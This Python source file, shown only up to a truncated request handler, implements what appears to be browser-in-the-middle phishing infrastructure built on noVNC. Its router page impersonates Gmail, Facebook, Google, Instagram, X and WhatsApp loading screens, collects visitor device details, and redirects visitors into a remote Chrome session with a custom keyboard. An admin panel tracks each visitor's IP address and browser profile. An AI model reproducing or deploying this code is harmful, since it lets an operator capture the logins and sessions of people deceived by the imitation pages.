#!/usr/bin/env python3
"""
noVNC Keyboard - Admin Panel & Session Router
Web interface for managing sessions and routing users
"""

import os
import json
import threading
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import socket

from session_manager import get_session_manager, ADMIN_PORT, NOVNC_PORT_START

# ============================================
# HTML TEMPLATES
# ============================================

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>noVNC Keyboard - Admin Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .header p {
            color: rgba(255,255,255,0.6);
            font-size: 14px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .stat-card h3 {
            font-size: 12px;
            color: rgba(255,255,255,0.5);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }

        .stat-card .value {
            font-size: 36px;
            font-weight: 700;
            color: #0a84ff;
        }

        .stat-card .value.warning {
            color: #ff9f0a;
        }

        .stat-card .value.success {
            color: #30d158;
        }

        .section {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .section h2 {
            font-size: 18px;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            text-align: left;
            padding: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        th {
            font-size: 12px;
            color: rgba(255,255,255,0.5);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        td {
            font-size: 14px;
        }

        .status {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
        }

        .status.active {
            background: rgba(48, 209, 88, 0.2);
            color: #30d158;
        }

        .status.inactive {
            background: rgba(255, 159, 10, 0.2);
            color: #ff9f0a;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.2s;
        }

        .btn-danger {
            background: rgba(255, 69, 58, 0.2);
            color: #ff453a;
        }

        .btn-danger:hover {
            background: rgba(255, 69, 58, 0.4);
        }

        .btn-primary {
            background: rgba(10, 132, 255, 0.2);
            color: #0a84ff;
        }

        .btn-primary:hover {
            background: rgba(10, 132, 255, 0.4);
        }

        .refresh-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .auto-refresh {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: rgba(255,255,255,0.6);
        }

        .auto-refresh input {
            width: 18px;
            height: 18px;
        }

        .no-sessions {
            text-align: center;
            padding: 40px;
            color: rgba(255,255,255,0.4);
        }

        .ip-address {
            font-family: monospace;
            background: rgba(255,255,255,0.1);
            padding: 2px 8px;
            border-radius: 4px;
        }

        .port {
            color: #0a84ff;
            font-family: monospace;
        }

        .time-ago {
            color: rgba(255,255,255,0.5);
            font-size: 12px;
        }

        @media (max-width: 768px) {
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .section {
                padding: 15px;
                overflow-x: auto;
            }
            
            table {
                font-size: 12px;
                min-width: 600px;
            }
            
            th, td {
                padding: 8px 6px;
                white-space: nowrap;
            }
            
            .header h1 {
                font-size: 22px;
            }
            
            .refresh-bar {
                flex-direction: column;
                gap: 15px;
                align-items: flex-start;
            }
            
            .btn {
                width: 100%;
                text-align: center;
            }
        }
        
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            
            .stats {
                grid-template-columns: 1fr 1fr;
                gap: 10px;
            }
            
            .stat-card {
                padding: 15px;
            }
            
            .stat-card .value {
                font-size: 28px;
            }
            
            .header {
                padding: 20px 0;
            }
            
            .header h1 {
                font-size: 18px;
            }
            
            .section h2 {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⌨️ noVNC Keyboard Admin</h1>
            <p>Multi-user session management</p>
        </div>

        <div class="stats" id="stats">
            <!-- Stats loaded via JS -->
        </div>

        <div class="refresh-bar">
            <div class="auto-refresh">
                <input type="checkbox" id="autoRefresh" checked>
                <label for="autoRefresh">Auto-refresh every 5s</label>
            </div>
            <button class="btn btn-primary" onclick="loadData()">↻ Refresh Now</button>
        </div>

        <div class="section">
            <h2>Active Sessions</h2>
            <div id="sessions">
                <!-- Sessions loaded via JS -->
            </div>
        </div>
    </div>

    <script>
        let autoRefreshInterval;

        function timeAgo(dateStr) {
            const date = new Date(dateStr);
            const now = new Date();
            const seconds = Math.floor((now - date) / 1000);
            
            if (seconds < 60) return `${seconds}s ago`;
            if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
            if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
            return `${Math.floor(seconds / 86400)}d ago`;
        }

        function renderStats(stats) {
            document.getElementById('stats').innerHTML = `
                <div class="stat-card">
                    <h3>Active Sessions</h3>
                    <div class="value ${stats.active_sessions >= stats.max_sessions ? 'warning' : 'success'}">${stats.active_sessions}</div>
                </div>
                <div class="stat-card">
                    <h3>Max Sessions</h3>
                    <div class="value">${stats.max_sessions}</div>
                </div>
                <div class="stat-card">
                    <h3>Available Slots</h3>
                    <div class="value success">${stats.available_slots}</div>
                </div>
                <div class="stat-card">
                    <h3>Session Timeout</h3>
                    <div class="value">${stats.timeout_minutes}m</div>
                </div>
            `;
        }

        function renderSessions(sessions) {
            if (sessions.length === 0) {
                document.getElementById('sessions').innerHTML = `
                    <div class="no-sessions">No active sessions</div>
                `;
                return;
            }

            let html = `
                <table>
                    <thead>
                        <tr>
                            <th>IP Address</th>
                            <th>Display</th>
                            <th>noVNC Port</th>
                            <th>Agent Port</th>
                            <th>Profile</th>
                            <th>Last Activity</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            sessions.forEach(session => {
                html += `
                    <tr>
                        <td><span class="ip-address">${session.ip_address}</span></td>
                        <td>:${session.vnc_display}</td>
                        <td><span class="port">${session.novnc_port}</span></td>
                        <td><span class="port">${session.agent_port}</span></td>
                        <td>${session.chrome_profile}</td>
                        <td><span class="time-ago">${timeAgo(session.last_activity)}</span></td>
                        <td><span class="status ${session.status}">${session.status}</span></td>
                        <td>
                            <button class="btn btn-danger" onclick="closeSession('${session.session_id}')">Close</button>
                        </td>
                    </tr>
                `;
            });

            html += '</tbody></table>';
            document.getElementById('sessions').innerHTML = html;
        }

        async function loadData() {
            try {
                const response = await fetch('/api/sessions');
                const data = await response.json();
                renderStats(data.stats);
                renderSessions(data.sessions);
            } catch (error) {
                console.error('Failed to load data:', error);
            }
        }

        async function closeSession(sessionId) {
            if (!confirm('Close this session?')) return;
            
            try {
                await fetch(`/api/sessions/${sessionId}`, { method: 'DELETE' });
                loadData();
            } catch (error) {
                console.error('Failed to close session:', error);
            }
        }

        function toggleAutoRefresh() {
            const enabled = document.getElementById('autoRefresh').checked;
            if (enabled) {
                autoRefreshInterval = setInterval(loadData, 5000);
            } else {
                clearInterval(autoRefreshInterval);
            }
        }

        document.getElementById('autoRefresh').addEventListener('change', toggleAutoRefresh);
        
        // Initial load
        loadData();
        toggleAutoRefresh();
    </script>
</body>
</html>
"""

ROUTER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: background 0.3s;
        }

        /* Theme: Generic */
        body.theme-generic {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
        }
        .theme-generic .spinner { border-top-color: #0a84ff; }

        /* Theme: Gmail - Realistic */
        body.theme-gmail {
            background: #fff;
            color: #202124;
        }
        .theme-gmail .loader {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .theme-gmail .logo {
            font-size: 48px;
            margin-bottom: 0;
        }
        .theme-gmail .gmail-logo {
            width: 74px;
            height: 74px;
            margin-bottom: 20px;
        }
        .theme-gmail .spinner {
            display: none;
        }
        .theme-gmail .gmail-spinner {
            display: block;
            width: 40px;
            height: 40px;
            margin: 20px auto;
        }
        .theme-gmail .gmail-spinner svg {
            animation: gmail-rotate 1.4s linear infinite;
        }
        .theme-gmail .gmail-spinner circle {
            stroke: #1a73e8;
            stroke-dasharray: 80, 200;
            stroke-dashoffset: 0;
            animation: gmail-dash 1.4s ease-in-out infinite;
            stroke-linecap: round;
        }
        @keyframes gmail-rotate {
            100% { transform: rotate(360deg); }
        }
        @keyframes gmail-dash {
            0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
            50% { stroke-dasharray: 89, 200; stroke-dashoffset: -35; }
            100% { stroke-dasharray: 89, 200; stroke-dashoffset: -124; }
        }
        .theme-gmail h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }
        .theme-gmail p {
            font-size: 14px;
            color: #5f6368;
        }

        /* Theme: Facebook - Realistic */
        body.theme-facebook {
            background: #f0f2f5;
            color: #1c1e21;
        }
        .theme-facebook .loader {
            background: #fff;
            padding: 40px 60px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .theme-facebook .logo {
            color: #1877f2;
            font-size: 60px;
            font-weight: 700;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        }
        .theme-facebook .spinner { border-top-color: #1877f2; }
        .theme-facebook h1 { color: #1c1e21; font-size: 16px; }
        .theme-facebook p { color: #65676b; }

        /* Theme: Google - Realistic */
        body.theme-google {
            background: #fff;
            color: #202124;
        }
        .theme-google .google-dots {
            display: flex;
            gap: 8px;
            margin: 20px 0;
        }
        .theme-google .google-dots span {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            animation: google-bounce 1.4s ease-in-out infinite;
        }
        .theme-google .google-dots span:nth-child(1) { background: #4285f4; animation-delay: 0s; }
        .theme-google .google-dots span:nth-child(2) { background: #ea4335; animation-delay: 0.2s; }
        .theme-google .google-dots span:nth-child(3) { background: #fbbc05; animation-delay: 0.4s; }
        .theme-google .google-dots span:nth-child(4) { background: #34a853; animation-delay: 0.6s; }
        @keyframes google-bounce {
            0%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
        }
        .theme-google .spinner { display: none; }

        /* Theme: Instagram - Realistic */
        body.theme-instagram {
            background: #fafafa;
            color: #262626;
        }
        .theme-instagram .logo {
            font-size: 0;
        }
        .theme-instagram .instagram-logo {
            width: 80px;
            height: 80px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 20px;
            margin-bottom: 20px;
        }
        .theme-instagram .spinner { border-top-color: #c13584; }

        /* Theme: Twitter/X - Realistic */
        body.theme-twitter {
            background: #000;
            color: #e7e9ea;
        }
        .theme-twitter .logo {
            font-size: 72px;
            font-weight: 800;
            margin-bottom: 20px;
        }
        .theme-twitter .spinner { border-top-color: #1d9bf0; border-color: rgba(255,255,255,0.2); }
        .theme-twitter h1, .theme-twitter p { color: #e7e9ea; }

        /* Theme: WhatsApp - Realistic */
        body.theme-whatsapp {
            background: #111b21;
            color: #e9edef;
        }
        .theme-whatsapp .logo { font-size: 0; }
        .theme-whatsapp .whatsapp-logo {
            width: 80px;
            height: 80px;
            margin-bottom: 30px;
        }
        .theme-whatsapp .spinner { border-top-color: #00a884; border-color: rgba(255,255,255,0.1); }
        .theme-whatsapp h1 { color: #e9edef; font-size: 16px; font-weight: 400; }
        .theme-whatsapp p { color: #8696a0; }
        .theme-whatsapp .whatsapp-progress {
            width: 200px;
            height: 3px;
            background: #2a3942;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .theme-whatsapp .whatsapp-progress-bar {
            height: 100%;
            background: #00a884;
            width: 0%;
            animation: whatsapp-load 3s ease-in-out forwards;
        }
        @keyframes whatsapp-load {
            0% { width: 0%; }
            30% { width: 30%; }
            60% { width: 60%; }
            100% { width: 90%; }
        }

        .loader {
            text-align: center;
            padding: 20px;
        }

        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(0,0,0,0.1);
            border-top-color: #0a84ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        h1 {
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 8px;
        }

        p {
            opacity: 0.7;
            font-size: 14px;
        }

        .error {
            color: #d93025;
            margin-top: 20px;
            opacity: 1;
        }

        .hidden { display: none; }
    </style>
</head>
<body class="theme-generic">
    <div class="loader" id="loader">
        <!-- Gmail Logo SVG -->
        <svg class="gmail-logo hidden" viewBox="0 0 74 74" xmlns="http://www.w3.org/2000/svg">
            <path d="M37 74C57.4345 74 74 57.4345 74 37C74 16.5655 57.4345 0 37 0C16.5655 0 0 16.5655 0 37C0 57.4345 16.5655 74 37 74Z" fill="#F2F2F2"/>
            <path d="M20.5 23H53.5C55.15 23 56.5 24.35 56.5 26V48C56.5 49.65 55.15 51 53.5 51H20.5C18.85 51 17.5 49.65 17.5 48V26C17.5 24.35 18.85 23 20.5 23Z" fill="#EA4335"/>
            <path d="M56.5 26L37 39L17.5 26V48C17.5 49.65 18.85 51 20.5 51H53.5C55.15 51 56.5 49.65 56.5 48V26Z" fill="#FBBC05"/>
            <path d="M17.5 26L37 39L56.5 26V48L37 35L17.5 48V26Z" fill="#34A853"/>
            <path d="M17.5 26V28L37 41L56.5 28V26C56.5 24.35 55.15 23 53.5 23H20.5C18.85 23 17.5 24.35 17.5 26Z" fill="#C5221F"/>
            <path d="M53.5 23H51V48C51 49.65 52.35 51 54 51H53.5C55.15 51 56.5 49.65 56.5 48V26C56.5 24.35 55.15 23 53.5 23Z" fill="#1A73E8"/>
        </svg>

        <!-- Gmail Spinner -->
        <div class="gmail-spinner hidden">
            <svg viewBox="0 0 50 50">
                <circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle>
            </svg>
        </div>

        <!-- WhatsApp Logo SVG -->
        <svg class="whatsapp-logo hidden" viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg">
            <circle cx="40" cy="40" r="40" fill="#25D366"/>
            <path d="M56.5 23.5C52.4 19.4 46.8 17 40.8 17C28.3 17 18 27.3 18 39.8C18 43.8 19 47.7 21 51.1L17.8 63L30 59.9C33.3 61.7 37 62.6 40.8 62.6C53.3 62.6 63.6 52.3 63.6 39.8C63.6 33.8 61.2 28.2 56.5 23.5ZM40.8 58.3C37.4 58.3 34.1 57.4 31.2 55.8L30.5 55.4L23.5 57.2L25.4 50.4L24.9 49.6C23.1 46.6 22.2 43.2 22.2 39.8C22.2 29.6 30.6 21.2 40.9 21.2C45.8 21.2 50.4 23.1 53.9 26.6C57.4 30.1 59.4 34.8 59.4 39.8C59.3 50.1 50.9 58.3 40.8 58.3ZM50.8 44.1C50.3 43.8 47.6 42.5 47.1 42.3C46.7 42.1 46.3 42 46 42.5C45.6 43 44.6 44.2 44.3 44.6C44 45 43.6 45 43.2 44.8C40.3 43.4 38.4 42.2 36.4 38.9C35.9 38 36.9 38.1 37.8 36.3C37.9 36 37.9 35.6 37.7 35.3C37.5 35 36.4 32.3 36 31.3C35.6 30.4 35.2 30.5 34.9 30.5C34.6 30.5 34.2 30.5 33.9 30.5C33.5 30.5 32.9 30.7 32.4 31.2C31.9 31.7 30.5 33 30.5 35.7C30.5 38.4 32.4 41 32.7 41.4C33 41.8 36.3 46.9 41.3 49.3C45.1 51 46.3 50.8 47.3 50.7C48.8 50.5 51 49.4 51.4 48.1C51.9 46.9 51.9 45.8 51.7 45.6C51.5 44.4 51.2 44.3 50.8 44.1Z" fill="white"/>
        </svg>
        
        <div class="whatsapp-progress hidden">
            <div class="whatsapp-progress-bar"></div>
        </div>

        <!-- Google Dots -->
        <div class="google-dots hidden">
            <span></span><span></span><span></span><span></span>
        </div>

        <!-- Instagram Logo -->
        <div class="instagram-logo hidden"></div>

        <div class="logo" id="logo">🌐</div>
        <div class="spinner" id="spinner"></div>
        <h1 id="title">Loading...</h1>
        <p id="subtitle">Please wait</p>
        <p id="error" class="error" style="display:none;"></p>
    </div>

    <script>
        const themes = {
            gmail: {
                theme: 'gmail',
                title: 'Loading Gmail',
                subtitle: 'This may take a few seconds',
                setup: () => {
                    document.querySelector('.gmail-logo').classList.remove('hidden');
                    document.querySelector('.gmail-spinner').classList.remove('hidden');
                    document.getElementById('logo').classList.add('hidden');
                }
            },
            facebook: {
                theme: 'facebook',
                logo: 'facebook',
                title: 'Logging in...',
                subtitle: '',
                setup: () => {
                    document.getElementById('logo').textContent = 'facebook';
                    document.getElementById('logo').style.fontFamily = '"Helvetica Neue", Helvetica, Arial, sans-serif';
                }
            },
            google: {
                theme: 'google',
                title: '',
                subtitle: '',
                setup: () => {
                    document.querySelector('.google-dots').classList.remove('hidden');
                    document.getElementById('logo').innerHTML = '<span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>';
                    document.getElementById('logo').style.fontSize = '48px';
                    document.getElementById('logo').style.fontWeight = '500';
                }
            },
            instagram: {
                theme: 'instagram',
                title: 'Loading...',
                subtitle: '',
                setup: () => {
                    document.querySelector('.instagram-logo').classList.remove('hidden');
                    document.getElementById('logo').classList.add('hidden');
                }
            },
            twitter: {
                theme: 'twitter',
                logo: '𝕏',
                title: '',
                subtitle: ''
            },
            x: {
                theme: 'twitter',
                logo: '𝕏',
                title: '',
                subtitle: ''
            },
            whatsapp: {
                theme: 'whatsapp',
                title: 'WhatsApp',
                subtitle: 'End-to-end encrypted',
                setup: () => {
                    document.querySelector('.whatsapp-logo').classList.remove('hidden');
                    document.querySelector('.whatsapp-progress').classList.remove('hidden');
                    document.getElementById('logo').classList.add('hidden');
                    document.getElementById('spinner').classList.add('hidden');
                }
            }
        };

        function detectSite(url) {
            if (!url) return null;
            url = url.toLowerCase();
            if (url.includes('gmail') || url.includes('mail.google')) return 'gmail';
            if (url.includes('facebook') || url.includes('fb.com')) return 'facebook';
            if (url.includes('instagram')) return 'instagram';
            if (url.includes('twitter') || url.includes('x.com')) return 'twitter';
            if (url.includes('whatsapp') || url.includes('web.whatsapp')) return 'whatsapp';
            if (url.includes('google')) return 'google';
            return null;
        }

        function applyTheme(url) {
            const site = detectSite(url);
            if (site && themes[site]) {
                const config = themes[site];
                document.body.className = 'theme-' + config.theme;
                if (config.logo) document.getElementById('logo').textContent = config.logo;
                if (config.title) document.getElementById('title').textContent = config.title;
                if (config.subtitle !== undefined) document.getElementById('subtitle').textContent = config.subtitle;
                if (config.setup) config.setup();
            } else if (url) {
                try {
                    const hostname = new URL(url).hostname.replace('www.', '');
                    document.getElementById('title').textContent = 'Loading ' + hostname;
                    document.getElementById('subtitle').textContent = 'Please wait...';
                } catch(e) {}
            }
        }

        function getScreenSize() {
            return {
                width: window.innerWidth,
                height: window.innerHeight,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                pixelRatio: window.devicePixelRatio || 1,
                userAgent: navigator.userAgent
            };
        }

        async function checkSessionReady(sessionId) {
            // Poll until session is ready (Chrome loaded)
            for (let i = 0; i < 30; i++) { // Max 30 seconds
                try {
                    const response = await fetch('/api/session/' + sessionId + '/status');
                    const data = await response.json();
                    if (data.ready) {
                        return true;
                    }
                } catch(e) {}
                await new Promise(r => setTimeout(r, 1000));
            }
            return false;
        }

        async function connect() {
            try {
                const configResponse = await fetch('/api/config');
                const config = await configResponse.json();
                
                if (config.url) {
                    applyTheme(config.url);
                }
                
                const screenInfo = getScreenSize();
                
                const response = await fetch('/api/connect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ screen: screenInfo })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Wait for session to be ready
                    document.getElementById('subtitle').textContent = 'Almost there...';
                    
                    const ready = await checkSessionReady(data.session_id);
                    
                    if (ready) {
                        window.location.href = data.redirect_url;
                    } else {
                        // Redirect anyway after timeout
                        window.location.href = data.redirect_url;
                    }
                } else {
                    document.getElementById('error').textContent = data.error || 'Failed to create session';
                    document.getElementById('error').style.display = 'block';
                }
            } catch (error) {
                document.getElementById('error').textContent = 'Connection failed: ' + error.message;
                document.getElementById('error').style.display = 'block';
            }
        }
        
        connect();
    </script>
</body>
</html>
"""

KEYBOARD_WRAPPER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Session</title>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box;
        }
        html, body { 
            width: 100%; 
            height: 100%; 
            overflow: hidden; 
            background: #000;
            touch-action: manipulation;
        }
        #vnc-container {
            width: 100%;
            height: 100%;
            position: relative;
        }
        #vnc-iframe { 
            width: 100%; 
            height: 100%; 
            border: none;
            position: absolute;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
    <div id="vnc-container">
        <iframe id="vnc-iframe" src="SESSION_VNC_URL" allow="fullscreen"></iframe>
    </div>

    <script>
        const SESSION_ID = 'SESSION_ID_PLACEHOLDER';
        const AGENT_PORT = AGENT_PORT_PLACEHOLDER;
        const AGENT_WS = 'ws://' + window.location.hostname + ':' + AGENT_PORT;
        
        // Activity tracking - ping every 30 seconds
        setInterval(() => {
            fetch('/api/activity/' + SESSION_ID, { method: 'POST' }).catch(() => {});
        }, 30000);
        
        // Connect to keyboard agent WebSocket
        let ws = null;
        let keyboardVisible = false;
        
        function connectAgent() {
            ws = new WebSocket(AGENT_WS);
            
            ws.onopen = () => {
                console.log('Agent connected');
            };
            
            ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    if (data.action === 'show_keyboard') {
                        showKeyboard();
                    } else if (data.action === 'hide_keyboard') {
                        hideKeyboard();
                    }
                } catch(e) {}
            };
            
            ws.onclose = () => {
                console.log('Agent disconnected, reconnecting...');
                setTimeout(connectAgent, 3000);
            };
            
            ws.onerror = () => {
                ws.close();
            };
        }
        
        function sendKey(type, key) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: type, key: key }));
            }
        }
        
        // Keyboard UI
        const keyboardHTML = `
        <div id="keyboard-overlay" style="
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #d1d3d9;
            transform: translateY(100%);
            transition: transform 0.25s ease;
            z-index: 9999;
            padding: 5px;
            padding-bottom: max(5px, env(safe-area-inset-bottom));
        ">
            <div id="kb-rows"></div>
        </div>
        `;
        
        const layouts = {
            letters: [
                ['q','w','e','r','t','y','u','i','o','p'],
                ['a','s','d','f','g','h','j','k','l'],
                ['shift','z','x','c','v','b','n','m','⌫'],
                ['123','🌐','space','return']
            ],
            numbers: [
                ['1','2','3','4','5','6','7','8','9','0'],
                ['-','/',':',';','(',')','$','&','@','"'],
                ['#+=','.',',','?','!',\"'\",'⌫'],
                ['ABC','🌐','space','return']
            ]
        };
        
        let currentLayout = 'letters';
        let isShift = false;
        let isCaps = false;
        
        function createKeyboard() {
            document.body.insertAdjacentHTML('beforeend', keyboardHTML);
            renderKeys();
        }
        
        function renderKeys() {
            const rows = document.getElementById('kb-rows');
            const layout = layouts[currentLayout];
            
            rows.innerHTML = layout.map((row, ri) => {
                return '<div style="display:flex;justify-content:center;margin-bottom:6px;">' +
                    row.map(key => {
                        let display = key;
                        let width = 'calc((100% - 50px) / 10)';
                        let bg = '#fff';
                        
                        if (key === 'shift') { display = '⇧'; width = '42px'; bg = isShift || isCaps ? '#fff' : '#adb3bc'; }
                        else if (key === '⌫') { width = '42px'; bg = '#adb3bc'; }
                        else if (key === '123' || key === 'ABC' || key === '#+=') { width = '42px'; bg = '#adb3bc'; }
                        else if (key === '🌐') { width = '38px'; bg = '#adb3bc'; }
                        else if (key === 'space') { display = 'space'; width = 'calc(100% - 200px)'; }
                        else if (key === 'return') { display = 'return'; width = '80px'; bg = '#007aff'; }
                        else if (ri === 1 && currentLayout === 'letters') { width = 'calc((100% - 40px) / 9)'; }
                        else if (ri === 2 && currentLayout === 'letters' && key.length === 1) { width = 'calc((100% - 100px) / 7)'; }
                        
                        if ((isShift || isCaps) && key.length === 1 && /[a-z]/.test(key)) {
                            display = key.toUpperCase();
                        }
                        
                        const color = key === 'return' ? '#fff' : '#000';
                        
                        return '<button data-key="' + key + '" style="' +
                            'width:' + width + ';height:42px;margin:0 2px;border:none;border-radius:5px;' +
                            'background:' + bg + ';color:' + color + ';font-size:' + (key.length > 1 ? '14px' : '22px') + ';' +
                            'box-shadow:0 1px 0 rgba(0,0,0,0.35);-webkit-tap-highlight-color:transparent;' +
                        '">' + display + '</button>';
                    }).join('') +
                '</div>';
            }).join('');
            
            // Add event listeners
            rows.querySelectorAll('button').forEach(btn => {
                btn.addEventListener('touchstart', (e) => {
                    e.preventDefault();
                    btn.style.transform = 'scale(0.95)';
                    btn.style.opacity = '0.7';
                });
                btn.addEventListener('touchend', (e) => {
                    e.preventDefault();
                    btn.style.transform = '';
                    btn.style.opacity = '';
                    handleKey(btn.dataset.key);
                });
            });
        }
        
        function handleKey(key) {
            if (key === 'shift') {
                if (isShift) { isCaps = true; isShift = false; }
                else if (isCaps) { isCaps = false; }
                else { isShift = true; }
                renderKeys();
            } else if (key === '123') {
                currentLayout = 'numbers';
                renderKeys();
            } else if (key === 'ABC') {
                currentLayout = 'letters';
                renderKeys();
            } else if (key === '#+=') {
                // Could add symbols layout
            } else if (key === '🌐') {
                // Language switch
            } else if (key === 'space') {
                sendKey('special', 'space');
            } else if (key === 'return') {
                sendKey('special', 'Return');
            } else if (key === '⌫') {
                sendKey('special', 'BackSpace');
            } else {
                let char = key;
                if ((isShift || isCaps) && /[a-z]/.test(key)) {
                    char = key.toUpperCase();
                }
                sendKey('key', char);
                if (isShift && !isCaps) {
                    isShift = false;
                    renderKeys();
                }
            }
        }
        
        function showKeyboard() {
            const kb = document.getElementById('keyboard-overlay');
            if (kb) {
                kb.style.transform = 'translateY(0)';
                keyboardVisible = true;
            }
        }
        
        function hideKeyboard() {
            const kb = document.getElementById('keyboard-overlay');
            if (kb) {
                kb.style.transform = 'translateY(100%)';
                keyboardVisible = false;
            }
        }
        
        // Initialize
        createKeyboard();
        connectAgent();
        
        // Hide keyboard when tapping on VNC
        document.getElementById('vnc-container').addEventListener('click', () => {
            // Let agent decide based on focus
        });
    </script>
</body>
</html>
"""


# ============================================
# REQUEST HANDLER
# ============================================

# Global config for current session settings
_server_config = {
    'url': '',
    'vnc_file': 'vnc.html'
}

def set_server_config(url='', vnc_file='vnc.html'):
    """Set the server config (called from launcher)"""
    global _server_config
    _server_config['url'] = url
    _server_config['vnc_file'] = vnc_file

def get_server_config():
    """Get current server config"""
    return _server_config.copy()


class AdminHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress default logging
    
    def send_json(self, data, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_html(self, html, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def get_client_ip(self):
        # Check for forwarded IP
        forwarded = self.headers.get('X-Forwarded-For')
        if forwarded:
            return forwarded.split(',')[0].strip()
        return self.client_address[0]
    
    def check_session_ready(self, session):
        """Check if Chrome has loaded in the session"""
        import subprocess
        try:
            # Check if Chrome window exists and has a title (page loaded)
            result = subprocess.run(
                ['xdotool', 'search', '--name', '.'],
                env={'DISPLAY': f':{session.vnc_display}'},
                capture_output=True,
                text=True,
                timeout=2
            )
            # If we find windows, Chrome is probably ready
            if result.stdout.strip():
                return True
        except:
            pass
        return False
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        manager = get_session_manager()
        
